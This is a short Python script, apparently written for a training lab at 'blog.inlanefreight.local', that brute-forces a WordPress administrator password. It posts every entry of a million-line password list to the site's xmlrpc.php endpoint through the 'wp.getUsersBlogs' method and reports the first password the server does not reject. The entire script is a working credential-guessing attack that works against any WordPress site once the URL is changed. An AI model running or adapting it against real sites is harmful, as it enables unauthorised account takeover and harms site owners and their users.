import requests as rq

url =  "http://blog.inlanefreight.local/xmlrpc.php"
file =  open("./Ressources/bruteforce-database-master/1000000-password-seclists.txt", "r")
doc = ["bro"]
a = 0
for i in file : 
    a+=1
    dataXml = """<?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
        <methodName>wp.getUsersBlogs</methodName>
        <params>
            <param>
                <value>admin</value>
            </param>
            <param>
                <value>{}</value>
            </param>
        </params>
    </methodCall>""".format(i)
    r = rq.post(url,data=dataXml)
    print("{} {}".format(r.status_code, i))
    if not "Incorrect" in r.text : 
        print("the password is " "{}".format(i))
        break
